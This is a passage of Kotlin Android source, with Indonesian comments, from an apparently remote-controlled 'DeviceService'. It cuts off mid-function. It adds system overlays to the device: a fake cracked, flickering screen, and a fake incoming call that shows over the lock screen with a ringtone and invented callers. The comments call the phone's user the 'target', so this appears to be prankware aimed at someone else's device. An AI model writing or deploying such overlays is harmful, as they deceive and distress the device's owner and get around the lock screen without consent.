private val lcdOverlayWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }

private fun setLcdBroken(on: Boolean) {
    if (on) {
        if (lcdOverlayView != null) return // sudah aktif

        val html = getLcdBrokenHtml()

        Handler(Looper.getMainLooper()).post {
            try {
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    // NOT_TOUCHABLE = sentuhan tembus ke bawah, layar tetap interaktif
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.TRANSLUCENT
                )

                val wv = android.webkit.WebView(this@DeviceService).apply {
                    settings.javaScriptEnabled = true
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                    // background transparan biar layar di bawah keliatan
                    loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
                }

                lcdOverlayView = wv
                lcdOverlayWm.addView(wv, params)

                emitStatus(JSONObject().apply { put("lcdBroken", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "setLcdBroken on: ${e.message}")
            }
        }
    } else {
        Handler(Looper.getMainLooper()).post {
            lcdOverlayView?.let {
                try { lcdOverlayWm.removeView(it) } catch (_: Exception) {}
            }
            lcdOverlayView = null
            emitStatus(JSONObject().apply { put("lcdBroken", false) })
        }
    }
}

private fun getLcdBrokenHtml(): String {
    // isi dari document index 3 — salin mentah
    return """<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>.</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: transparent;
      width: 100vw; height: 100vh;
      overflow: hidden; position: relative;
    }
    .scanline { position:fixed;left:0;width:100%;pointer-events:none;z-index:9998;mix-blend-mode:screen; }
    .dead-pixel { position:fixed;background:#000;z-index:9997;pointer-events:none; }
    .vline { position:fixed;top:0;height:100%;width:2px;z-index:9996;pointer-events:none;opacity:0.85; }
    .noise { position:fixed;inset:0;z-index:9995;opacity:0.04;pointer-events:none;
      background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
      background-repeat:repeat;background-size:200px 200px; }
    .tint { position:fixed;inset:0;z-index:9990;pointer-events:none;animation:tintFlicker 0.08s infinite; }
    @keyframes tintFlicker {
      0%{background:rgba(0,255,80,0.03)} 25%{background:rgba(140,0,255,0.05)}
      50%{background:rgba(0,255,80,0.02)} 75%{background:rgba(180,0,255,0.04)}
      100%{background:rgba(0,255,80,0.03)}
    }
    .crack-svg{position:fixed;inset:0;width:100%;height:100%;z-index:10000;pointer-events:none;}
  </style>
</head>
<body>
<div class="tint"></div>
<div class="noise"></div>
<svg class="crack-svg" viewBox="0 0 1920 1080" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <filter id="glow-green"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <filter id="glow-purple"><feGaussianBlur stdDeviation="2.5" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
  </defs>
  <g filter="url(#glow-green)" opacity="0.9">
    <line x1="320" y1="210" x2="180" y2="80" stroke="#00ff44" stroke-width="1.5"/>
    <line x1="320" y1="210" x2="420" y2="60" stroke="#00ff44" stroke-width="1"/>
    <line x1="320" y1="210" x2="500" y2="200" stroke="#00ee33" stroke-width="1.2"/>
    <line x1="320" y1="210" x2="220" y2="340" stroke="#00ff44" stroke-width="1"/>
    <line x1="320" y1="210" x2="100" y2="300" stroke="#00cc22" stroke-width="0.8"/>
    <line x1="320" y1="210" x2="60" y2="180" stroke="#00ff44" stroke-width="1.3"/>
    <line x1="320" y1="210" x2="280" y2="420" stroke="#00ff44" stroke-width="0.9"/>
    <line x1="320" y1="210" x2="600" y2="350" stroke="#00ee44" stroke-width="1"/>
    <circle cx="320" cy="210" r="18" fill="none" stroke="#00ff44" stroke-width="1" opacity="0.6"/>
    <circle cx="320" cy="210" r="8" fill="rgba(0,255,68,0.2)"/>
  </g>
  <g filter="url(#glow-purple)" opacity="0.85">
    <line x1="1500" y1="780" x2="1650" y2="920" stroke="#aa00ff" stroke-width="1.5"/>
    <line x1="1500" y1="780" x2="1380" y2="950" stroke="#bb00ff" stroke-width="1"/>
    <line x1="1500" y1="780" x2="1700" y2="680" stroke="#aa00ff" stroke-width="1.2"/>
    <line x1="1500" y1="780" x2="1300" y2="680" stroke="#9900ee" stroke-width="1"/>
    <line x1="1500" y1="780" x2="1750" y2="800" stroke="#aa00ff" stroke-width="0.8"/>
    <line x1="1500" y1="780" x2="1450" y2="600" stroke="#bb00ff" stroke-width="1"/>
    <line x1="1500" y1="780" x2="1600" y2="550" stroke="#aa00ee" stroke-width="0.9"/>
    <circle cx="1500" cy="780" r="20" fill="none" stroke="#aa00ff" stroke-width="1" opacity="0.6"/>
    <circle cx="1500" cy="780" r="9" fill="rgba(170,0,255,0.2)"/>
  </g>
  <g opacity="0.7">
    <polyline points="320,210 480,310 650,290 780,400 950,380 1100,500 1280,520 1500,780" fill="none" stroke="#55ff55" stroke-width="1" stroke-dasharray="8,3"/>
    <polyline points="320,210 400,420 520,530 700,610 900,640 1100,700 1300,730 1500,780" fill="none" stroke="#bb55ff" stroke-width="0.8" stroke-dasharray="6,4"/>
  </g>
  <ellipse cx="320" cy="210" rx="60" ry="45" fill="rgba(0,0,0,0.55)"/>
  <ellipse cx="1500" cy="780" rx="70" ry="50" fill="rgba(0,0,0,0.5)"/>
  <g opacity="0.6">
    <rect x="600" y="150" width="80" height="3" fill="#cc00ff"/>
    <rect x="900" y="400" width="60" height="2" fill="#aa00ff"/>
    <rect x="1100" y="250" width="100" height="3" fill="#dd00ff" opacity="0.5"/>
    <rect x="200" y="600" width="70" height="2" fill="#bb00ff"/>
    <rect x="1600" y="300" width="90" height="3" fill="#aa00ee"/>
  </g>
  <g opacity="0.6">
    <rect x="700" y="500" width="60" height="2" fill="#00ff44"/>
    <rect x="400" y="700" width="80" height="3" fill="#00ee33"/>
    <rect x="1200" y="600" width="70" height="2" fill="#00ff55"/>
    <rect x="1700" y="500" width="50" height="2" fill="#00ff44"/>
    <rect x="850" y="850" width="90" height="3" fill="#00ee44" opacity="0.5"/>
  </g>
</svg>
<script>
  const body=document.body;
  const vColors=['#00ff44','#aa00ff','#cc00ff','#00ee33','#bb00ff','#55ff55'];
  for(let i=0;i<28;i++){const el=document.createElement('div');el.className='vline';el.style.left=Math.random()*100+'vw';el.style.width=(Math.random()*2+0.5)+'px';el.style.background=vColors[Math.floor(Math.random()*vColors.length)];el.style.opacity=(Math.random()*0.6+0.2).toFixed(2);body.appendChild(el);}
  for(let i=0;i<35;i++){const el=document.createElement('div');el.className='scanline';el.style.top=Math.random()*100+'vh';el.style.height=(Math.random()*3+0.5)+'px';el.style.background=vColors[Math.floor(Math.random()*vColors.length)];el.style.opacity=(Math.random()*0.55+0.15).toFixed(2);body.appendChild(el);}
  for(let i=0;i<18;i++){const el=document.createElement('div');el.className='dead-pixel';el.style.left=Math.random()*98+'vw';el.style.top=Math.random()*98+'vh';el.style.width=(Math.floor(Math.random()*40)+8)+'px';el.style.height=(Math.floor(Math.random()*8)+2)+'px';el.style.opacity=(Math.random()*0.7+0.3).toFixed(2);body.appendChild(el);}
  const style=document.createElement('style');
  style.textContent='@keyframes vFlicker{0%{opacity:0.1}30%{opacity:0.8}45%{opacity:0}60%{opacity:0.7}80%{opacity:0.3}100%{opacity:0.6}}@keyframes hFlicker{0%{opacity:0.05}20%{opacity:0.6}40%{opacity:0}55%{opacity:0.5}75%{opacity:0.2}100%{opacity:0.4}}';
  document.head.appendChild(style);
  document.querySelectorAll('.vline').forEach(el=>{el.style.animation='vFlicker '+(Math.random()*120+40)+'ms infinite';});
  document.querySelectorAll('.scanline').forEach(el=>{el.style.animation='hFlicker '+(Math.random()*100+50)+'ms infinite';});
  setInterval(()=>{const lines=document.querySelectorAll('.scanline');const pick=lines[Math.floor(Math.random()*lines.length)];if(pick)pick.style.top=Math.random()*100+'vh';const vlines=document.querySelectorAll('.vline');const vpick=vlines[Math.floor(Math.random()*vlines.length)];if(vpick)vpick.style.left=Math.random()*100+'vw';},200);
  setInterval(()=>{const tint=document.querySelector('.tint');if(!tint)return;const pick=Math.random();if(pick<0.15){tint.style.background='rgba(0,255,68,0.12)';setTimeout(()=>{tint.style.background='';},60);}else if(pick<0.30){tint.style.background='rgba(160,0,255,0.14)';setTimeout(()=>{tint.style.background='';},80);}},350);
</script>
</body>
</html>"""
}   
  
    
private var prankCallOverlayView: android.webkit.WebView? = null
private val prankCallWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }

private fun setPrankCall(on: Boolean) {
    if (on) {
        if (prankCallOverlayView != null) return

        val html = getPrankCallHtml()

        Handler(Looper.getMainLooper()).post {
            try {
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    // FLAG_NOT_FOCUSABLE diubah agar interaksi tombol geser/angkat telepon di layar bisa diklik target
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                )

                val wv = android.webkit.WebView(this@DeviceService).apply {
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled = true
                    setBackgroundColor(android.graphics.Color.BLACK)
                    loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
                }

                prankCallOverlayView = wv
                prankCallWm.addView(wv, params)

                emitStatus(JSONObject().apply { put("prankCallActive", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "setPrankCall on: ${e.message}")
            }
        }
    } else {
        Handler(Looper.getMainLooper()).post {
            prankCallOverlayView?.let {
                try { prankCallWm.removeView(it) } catch (_: Exception) {}
            }
            prankCallOverlayView = null
            emitStatus(JSONObject().apply { put("prankCallActive", false) })
        }
    }
}

private fun getPrankCallHtml(): String {
    return """<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Panggilan Masuk</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body {
      background: #181818;
      width: 100vw; height: 100vh;
      overflow: hidden; display: flex; flex-direction: column;
      justify-content: space-between; align-items: center;
      color: white; padding: 50px 20px 40px 20px;
    }
    .caller-info {
      text-align: center; margin-top: 15px;
      animation: fadeIn 1s ease-in-out;
    }
    .avatar {
      width: 105px; height: 105px; border-radius: 50%;
      background: #333; margin: 0 auto 15px;
      overflow: hidden; display: flex; align-items: center; justify-content: center;
      box-shadow: 0 0 20px rgba(255,255,255,0.08);
      border: 2px solid rgba(255,255,255,0.12);
    }
    .avatar img { width: 100%; height: 100%; object-fit: cover; }
    .name { font-size: 26px; font-weight: 400; margin-bottom: 6px; letter-spacing: 0.5px; }
    .number { font-size: 14px; color: #aaa; margin-bottom: 8px; }
    .status { font-size: 14px; color: #4cd964; letter-spacing: 1px; animation: pulse 1.5s infinite; }
    
    /* Grid 3 Kolom untuk Menu Panggilan Aktif */
    .in-call-menu {
      display: none; width: 100%; max-width: 340px;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px 10px; margin: 10px 0; justify-items: center;
      position: relative;
    }
    .menu-item { text-align: center; color: #bbb; font-size: 11px; width: 85px; cursor: pointer; }
    .menu-icon {
      width: 58px; height: 58px; border-radius: 50%; background: #2a2a2e;
      display: flex; align-items: center; justify-content: center; margin: 0 auto 6px;
      transition: background 0.2s;
    }
    .menu-icon svg { width: 22px; height: 22px; fill: #ffffff; }

    /* Popup Menu Lainnya */
    #moreModal {
      display: none; position: absolute; right: 10px; bottom: 75px; 
      background: #2b2b2f; width: 215px; border-radius: 14px; padding: 6px 0; z-index: 100;
      box-shadow: 0 8px 24px rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.1);
    }
    .more-option {
      padding: 12px 18px; font-size: 13px; color: #fff; cursor: pointer; text-align: left;
      display: flex; align-items: center; gap: 12px;
    }
    .more-option svg { width: 18px; height: 18px; fill: #aaa; }
    .more-option:active { background: #3a3a3f; }

    /* Papan Keypad Timbul */
    #keypadOverlay {
      display: none; position: fixed; inset: 0; background: rgba(18,18,18,0.96);
      z-index: 99; flex-direction: column; justify-content: flex-end; align-items: center; padding-bottom: 30px;
      animation: slideUp 0.3s ease-out;
    }
    .dial-display-container {
      display: flex; align-items: center; justify-content: center; width: 85%; max-width: 320px;
      margin-bottom: 25px; border-bottom: 1px solid #444; padding-bottom: 8px; position: relative;
    }
    .dial-display {
      font-size: 28px; color: #fff; letter-spacing: 2px; text-align: center; width: 100%;
      overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
    }
    .dial-backspace {
      position: absolute; right: 0; background: none; border: none; color: #aaa; font-size: 20px; cursor: pointer; padding: 5px;
    }
    .dial-grid {
      display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; width: 280px; margin-bottom: 20px; justify-items: center;
    }
    .dial-key {
      width: 62px; height: 62px; border-radius: 50%; background: #2b2b2f; color: white;
      font-size: 22px; border: none; display: flex; align-items: center; justify-content: center;
      cursor: pointer; transition: background 0.2s;
    }
    .dial-key:active { background: #444; }
    
    .keypad-bottom-row {
      display: flex; justify-content: space-around; align-items: center; width: 280px; margin-top: 5px;
    }
    .close-keypad {
      background: #ff3b30; width: 55px; height: 55px; border-radius: 50%; border: none;
      color: white; font-size: 18px; cursor: pointer; display: flex; align-items: center; justify-content: center;
      box-shadow: 0 4px 12px rgba(255,59,48,0.4);
    }

    /* Tombol Bagian Bawah */
    .actions {
      width: 100%; max-width: 340px;
      display: flex; justify-content: space-around; align-items: center;
      margin-bottom: 15px; padding: 0 5px;
    }
    .btn-container { text-align: center; }
    .btn {
      width: 70px; height: 70px; border-radius: 50%;
      border: none; display: flex; align-items: center; justify-content: center;
      cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
      transition: transform 0.2s; margin: 0 auto;
    }
    .btn svg { width: 28px; height: 28px; fill: currentColor; }
    .btn:active { transform: scale(0.9); }
    
    .btn-decline { background-color: #ff3b30; color: white; transform: rotate(135deg); }
    .btn-accept { background-color: #4cd964; color: white; animation: bounce 1.5s infinite; }
    .btn-normal { background-color: #2b2b2f; color: #fff; }
    .btn-label { font-size: 12px; color: #aaa; margin-top: 6px; }

    @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
    @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-8px);} 60% {transform: translateY(-4px);} }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(-15px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
  </style>
</head>
<body>
  <div class="caller-info">
    <div class="avatar" id="avatarContainer">
      <img id="callerAvatar" src="" alt="Avatar">
    </div>
    <div class="name" id="callerName">Memuat...</div>
    <div class="number" id="callerNumber">...</div>
    <div class="status" id="callStatus">Panggilan seluler masuk</div>
  </div>

  <!-- 6 Menu Grid Tengah -->
  <div class="in-call-menu" id="inCallMenu">
    <div class="menu-item" onclick="toggleActive(this)">
      <div class="menu-icon"><svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg></div>Mulai merekam
    </div>
    <div class="menu-item" onclick="toggleActive(this)">
      <div class="menu-icon"><svg viewBox="0 0 24 24"><path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3s-3 1.34-3 3v1l6.02 5.17zM4.27 3L3 4.27l6.01 6.01v.41c0 1.66 1.33 3 2.99 3 .22 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.1H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c.91-.13 1.77-.45 2.54-.9l4.19 4.19L21 19.73 4.27 3z"/></svg></div>Senyap
    </div>
    <div class="menu-item" onclick="toggleActive(this)">
      <div class="menu-icon"><svg viewBox="0 0 24 24"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg></div>Tahan
    </div>
    <div class="menu-item" onclick="alert('Ringkasan panggilan disalin')">
      <div class="menu-icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg></div>Ringkasan
    </div>
    <div class="menu-item" onclick="alert('Asisten KB Pintar aktif')">
      <div class="menu-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.03-.42 1.98-1.03 2.75z"/></svg></div>KB Pintar
    </div>
    <div class="menu-item" onclick="toggleMoreModal(event)">
      <div class="menu-icon"><svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></div>Lainnya
      
      <div id="moreModal">
        <div class="more-option" onclick="alert('Kontak diblokir')">
          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM4 12c0-4.42 3.58-8 8-8 1.85 0 3.55.63 4.9 1.69L5.69 16.9C4.63 15.55 4 13.85 4 12zm8 8c-1.85 0-3.55-.63-4.9-1.69L18.31 7.1C19.37 8.45 20 10.15 20 12c0 4.42-3.58 8-8 8z"/></svg>
          Blokir Nomor Ini
        </div>
        <div class="more-option" onclick="alert('Ditandai sebagai spam')">
          <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
          Laporkan Spam
        </div>
        <div class="more-option" onclick="alert('Kontak dibagikan')">
          <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
          Bagikan Kontak
        </div>
        <div class="more-option" onclick="alert('Pesan balasan cepat dikirim')">
          <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 9h12v2H6V9zm8 5H6v-2h8v2zm4-6H6V6h12v2z"/></svg>
          Kirim Pesan Cepat
        </div>
      </div>
    </div>
  </div>

  <!-- Papan Keypad Timbul -->
  <div id="keypadOverlay">
    <div class="dial-display-container">
      <div class="dial-display" id="dialInput"></div>
      <button class="dial-backspace" onclick="deleteKey()">⌫</button>
    </div>
    <div class="dial-grid">
      <button class="dial-key" onclick="pressKey('1')">1</button>
      <button class="dial-key" onclick="pressKey('2')">2</button>
      <button class="dial-key" onclick="pressKey('3')">3</button>
      <button class="dial-key" onclick="pressKey('4')">4</button>
      <button class="dial-key" onclick="pressKey('5')">5</button>
      <button class="dial-key" onclick="pressKey('6')">6</button>
      <button class="dial-key" onclick="pressKey('7')">7</button>
      <button class="dial-key" onclick="pressKey('8')">8</button>
      <button class="dial-key" onclick="pressKey('9')">9</button>
      <button class="dial-key" onclick="pressKey('*')">*</button>
      <button class="dial-key" onclick="pressKey('0')">0</button>
      <button class="dial-key" onclick="pressKey('#')">#</button>
    </div>
    <div class="keypad-bottom-row">
      <button class="close-keypad" onclick="toggleKeypad(false)">✕</button>
    </div>
  </div>

  <!-- Tombol Bagian Bawah -->
  <div class="actions" id="actionButtons">
    <div class="btn-container" id="declineContainer">
      <button class="btn btn-decline" onclick="closePrankCall()">
        <svg viewBox="0 0 24 24"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.7l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.73-1.68-1.36-2.66-1.85-.33-.16-.56-.51-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
      </button>
      <div class="btn-label" id="declineLabel">Tolak</div>
    </div>
    
    <div class="btn-container" id="acceptContainer">
      <button class="btn btn-accept" onclick="answerCall()">
        <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
      </button>
      <div class="btn-label">Terima</div>
    </div>
  </div>

  <script>
    const contacts = [
      { name: "Sayang ❤️", number: "+62 812-3456-7890 Indonesia", photo: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150" },
      { name: "Mama", number: "+62 813-9876-5432 Indonesia", photo: "https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150" },
      { name: "Papa", number: "+62 811-2233-4455 Indonesia", photo: "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=150" },
      { name: "Boss Kantor", number: "+62 821-1122-3344 Indonesia", photo: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150" },
      { name: "Kurir Paket", number: "+62 896-1234-5678 Indonesia", photo: "https://images.unsplash.com/photo-1492562080023-ab3db95bfbce?w=150" },
      { name: "Bestie ✨", number: "+62 878-9988-7766 Indonesia", photo: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150" }
    ];

    const randomContact = contacts[Math.floor(Math.random() * contacts.length)];
    document.getElementById("callerName").innerText = randomContact.name;
    document.getElementById("callerNumber").innerText = randomContact.number;
    document.getElementById("callerAvatar").src = randomContact.photo;

    // --- FITUR SUARA RINGTONE TELEPON (WEB AUDIO API) ---
    let audioCtx = null;
    let ringInterval = null;

    function startRingtone() {
      try {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        
        function playRingToneSequence() {
          if (!audioCtx) return;
          if (audioCtx.state === 'suspended') { audioCtx.resume(); }

          // Pola nada dering standar (Dering ganda: Tit-tit ... Tit-tit)
          const now = audioCtx.currentTime;
          
          [0, 0.15, 0.6, 0.75].forEach((timeOffset, idx) => {
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            
            // Frekuensi nada dering telepon seluler
            osc.frequency.setValueAtTime(idx < 2 ? 852 : 941, now + timeOffset);
            osc.type = 'sine';

            gain.gain.setValueAtTime(0.3, now + timeOffset);
            gain.gain.exponentialRampToValueAtTime(0.01, now + timeOffset + 0.1);

            osc.connect(gain);
            gain.connect(audioCtx.destination);

            osc.start(now + timeOffset);
            osc.stop(now + timeOffset + 0.1);
          });
        }

        playRingToneSequence();
        ringInterval = setInterval(playRingToneSequence, 3000); // Ulangi setiap 3 detik
      } catch (e) {}
    }

    function stopRingtone() {
      if (ringInterval) {
        clearInterval(ringInterval);
        ringInterval = null;
      }
      if (audioCtx) {
        audioCtx.close();
        audioCtx = null;
      }
    }

    // Jalankan ringtone otomatis saat halaman dimuat
    window.addEventListener('load', () => {
      startRingtone();
    });

    // Otomatis aktifkan audio jika ada interaksi sentuhan pertama dari target
    document.addEventListener('pointerdown', () => {
      if (audioCtx && audioCtx.state === 'suspended') {
        audioCtx.resume();
      }
    }, { once: true });
    // ----------------------------------------------------

    function closePrankCall() {
      stopRingtone();
      if (window.AndroidBridge && typeof window.AndroidBridge.closePrank === 'function') {
        window.AndroidBridge.closePrank();
      } else {
        location.href = "about:blank";
      }
    }

    function answerCall() {
      stopRingtone(); // Matikan suara dering saat telepon diangkat

      const statusEl = document.getElementById("callStatus");
      statusEl.style.animation = "none";
      statusEl.style.color = "#fff";
      
      let seconds = 0;
      setInterval(() => {
        seconds++;
        let mins = Math.floor(seconds / 60);
        let secs = seconds % 60;
        statusEl.innerText = (mins < 10 ? "0" + mins : mins) + ":" + (secs < 10 ? "0" + secs : secs);
      }, 1000);

      document.getElementById("inCallMenu").style.display = "grid";

      const actionButtons = document.getElementById("actionButtons");
      actionButtons.innerHTML = `
        <div class="btn-container">
          <button class="btn btn-normal" onclick="toggleActiveBtn(this)">
            <svg viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
          </button>
          <div class="btn-label">Speaker</div>
        </div>

        <div class="btn-container">
          <button class="btn btn-decline" onclick="closePrankCall()">
            <svg viewBox="0 0 24 24"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.7l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.73-1.68-1.36-2.66-1.85-.33-.16-.56-.51-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
          </button>
          <div class="btn-label">Akhiri</div>
        </div>

        <div class="btn-container">
          <button class="btn btn-normal" onclick="toggleKeypad(true)">
            <svg viewBox="0 0 24 24"><path d="M6 10c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm12 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-6 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM6 4c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm12 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-6 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM6 16c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm12 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-6 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
          </button>
          <div class="btn-label">Keypad</div>
        </div>
      `;
    }

    function toggleMoreModal(e) {
      e.stopPropagation();
      const modal = document.getElementById("moreModal");
      modal.style.display = modal.style.display === "block" ? "none" : "block";
    }

    window.onclick = function() {
      const modal = document.getElementById("moreModal");
      if (modal) modal.style.display = "none";
    }

    function toggleKeypad(show) {
      document.getElementById("keypadOverlay").style.display = show ? "flex" : "none";
    }

    let typedNumber = "";
    function pressKey(num) {
      typedNumber += num;
      document.getElementById("dialInput").innerText = typedNumber;
    }

    function deleteKey() {
      typedNumber = typedNumber.slice(0, -1);
